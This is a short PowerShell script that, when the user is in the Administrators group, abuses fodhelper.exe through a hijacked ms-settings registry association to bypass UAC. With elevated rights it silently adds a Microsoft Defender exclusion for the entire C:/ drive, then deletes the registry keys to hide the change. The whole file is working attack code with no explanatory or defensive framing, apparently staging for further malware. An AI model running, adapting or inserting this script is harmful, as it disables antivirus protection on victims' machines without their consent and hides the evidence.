

function If-Admin {
	$user = "$env:COMPUTERNAME\$env:USERNAME"
	$isAdmin = (Get-LocalGroupMember 'Administrators').Name -contains $user
if($isAdmin){
	$259="powershell.exe -w h Add-MpPreference -ExclusionPath C:/";reg add "HKCU\Software\Classes\.259\Shell\Open\command" /d $259 /f;reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".259" /f;fodhelper.exe;Start-Sleep -s 3;reg delete "HKCU\Software\Classes\.259\" /f;reg delete "HKCU\Software\Classes\ms-settings\" /f;

	}
	else{
	Break
	}
}

If-Admin